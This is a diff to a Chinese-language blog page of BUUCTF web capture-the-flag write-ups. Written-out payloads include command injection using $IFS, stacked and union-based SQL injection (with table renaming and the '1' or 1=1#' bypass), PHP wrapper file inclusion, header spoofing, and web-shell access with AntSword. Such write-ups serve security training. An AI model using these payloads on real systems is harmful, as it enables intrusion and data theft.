@@ -220,15 +220,85 @@ get传参cat&amp;#x3D;do">
 <p>因为源代码里规定flag不能顺序出现</p>
 <p>所以最终payload：?ip&#x3D;1;b&#x3D;ag;c&#x3D;fl;cat$IFS$c$b.php  flag在源代码，查看源代码即可</p>
 <h4 id="7-SUCTF-2019-EasySQL"><a href="#7-SUCTF-2019-EasySQL" class="headerlink" title="7.[SUCTF 2019]EasySQL"></a>7.[SUCTF 2019]EasySQL</h4><p>easysql但我觉得不easy啊，ε&#x3D;(´ο｀*)))唉是我太菜了</p>
-<p>试了集中注入都不行，最后堆叠注入可以</p>
+<p>这题禁了select,其他类型注入都不行，最后堆叠注入可以</p>
 <p>直接查表</p>
 <p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15.png"></p>
 <p>有个Flag；</p>
 <p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/16.png"></p>
 <p>有过滤，这题过滤了很多，后面看大佬们的wp才知道，后端语句是</p>
 <p>select $_POST[‘query’] || flag from Flag</p>
-<p>所以我们之间传入*，1</p>
+<p>所以我们直接传入*，1</p>
 <p>这时变为select  *，1|| flag from Flag。这样就可以查询表中所有信息了</p>
+<h4 id="8-强网杯-2019-随便注"><a href="#8-强网杯-2019-随便注" class="headerlink" title="8.[强网杯 2019]随便注"></a>8.[强网杯 2019]随便注</h4><p>这题我觉得是比较难的sql注入题，先判断注入类型</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/17.png"></p>
+<p>1’有报错，说明是单引号闭合</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/18.png"></p>
+<p>select被禁用了，那基本凉了，只能用堆叠注入了。</p>
+<p>1’;show databases;先查库</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/19.png"></p>
+<p>1’;show tables;查表</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/20.png"></p>
+<p>有两张表。1’;show columns from <code>1919810931114514</code>;还有1’;show columns from words;分别查这两张表</p>
+<p>最后发现flag在191这张表中，并且191这张表只有一个字段，而words有两个字段。</p>
+<p>看了网上大佬们的wp，有一种rename alert的方法，但是没说清楚为什么改成那个名字。</p>
+<p>下面说一下我的理解：</p>
+<p>当我们输入1’;时，有1和hahahah回显，输入2’;时，有2和miaomiaomiao回显，输入3’;时无回显，说明只有两个字段，或者可以1’ order by 3#查看，发现会报错。</p>
+<p>而words表是id,data两个字段，于是上面的回显分别对应id,data字段</p>
+<p>于是我们可以大胆猜测后端语句：select id,data from words where id&#x3D;’</p>
+<p>猜到后就不难了，我们可以借助后端这个select语句帮我们查询。因为是从words表查id字段</p>
+<p>所以我们只要把原来words表随便改其他名字，将191那张表改名为words,然后flag字段改名为id，这样后端语句查询的就是flag字段了。</p>
+<p>1’;</p>
+<p>rename table <code>words</code> to words1;         &#x2F;&#x2F;将原来words表改名为words1表</p>
+<p>rename table <code>1919810931114514</code> to <code>words</code>;       &#x2F;&#x2F;将191表改名为words表</p>
+<p>alter table words change flag id varchar(100);         &#x2F;&#x2F;将flag字段改成id，类型为varchar</p>
+<p>再查一下words表发现</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/21.png"></p>
+<p>已经更改成功</p>
+<p>这时再输入1，无回显，因为更改了表名所以这时id&#x3D;1的值查不到。为假。</p>
+<p>我们用万能密码1’ or 1&#x3D;1#使其永真就能爆出flag了</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/22.png"></p>
+<h4 id="9-极客大挑战-2019-Secret-File"><a href="#9-极客大挑战-2019-Secret-File" class="headerlink" title="9.[极客大挑战 2019]Secret File"></a>9.[极客大挑战 2019]Secret File</h4><p>进去页面什么都没有，先抓包<img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/23.png"></p>
+<p>有个Archive_room.php，访问进去</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/24.png"></p>
+<p>这里点击secret发现跳转很快，bp抓包看看</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/25.png"></p>
+<p>有个secr3t.php，访问进去</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/26.png"></p>
+<p>文件包含，不要跳目录，tp，不要用data,input</p>
+<p>直接伪协议读文件</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/27.png"></p>
+<p>base64即可</p>
+<h4 id="10-极客大挑战-2019-LoveSQL"><a href="#10-极客大挑战-2019-LoveSQL" class="headerlink" title="10.[极客大挑战 2019]LoveSQL"></a>10.[极客大挑战 2019]LoveSQL</h4><p>非常非常标准的sql注入题，输入1’报错，说明是单引号注入。</p>
+<p>判断字段。当输入1’ order by 4#时报错了，说明有三个字段。</p>
+<p>判断回显点：-1’ union select 1,2,3#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/28.png">2,3为回显点。</p>
+<p>接下来就是正常步骤了</p>
+<p>爆库：-1’ union select 1,database(),3#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/29.png"></p>
+<p>爆表：-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/30.png"></p>
+<p>爆列：-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’l0ve1ysq1’#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/31.png"></p>
+<p>爆字段：-1’ union select 1,group_concat(id,username,password),3 from l0ve1ysq1#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/32.png"></p>
+<p>得到flag</p>
+<h4 id="11-极客大挑战-2019-Http"><a href="#11-极客大挑战-2019-Http" class="headerlink" title="11.[极客大挑战 2019]Http"></a>11.[极客大挑战 2019]Http</h4><p>一道非常基础的题</p>
+<p>进去页面查看源代码，<img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/33.png"></p>
+<p>发现Secret.php，访问进去</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/34.png"></p>
+<p>抓包添加Referer头</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/35.png"></p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/36.png"></p>
+<p>提示换浏览器，改UA头</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/37.png"></p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/38.png"></p>
+<p>从本地访问</p>
+<p>添加XFF</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/39.png"></p>
+<p>send后即可得到flag。</p>
+<h4 id="12-极客大挑战-2019-Knife"><a href="#12-极客大挑战-2019-Knife" class="headerlink" title="12.[极客大挑战 2019]Knife"></a>12.[极客大挑战 2019]Knife</h4><p>一道水题，题目提示菜刀，蚁剑连接即可</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/40.png"></p>
+<p>flag在根目录。</p>
 
     </div>
 
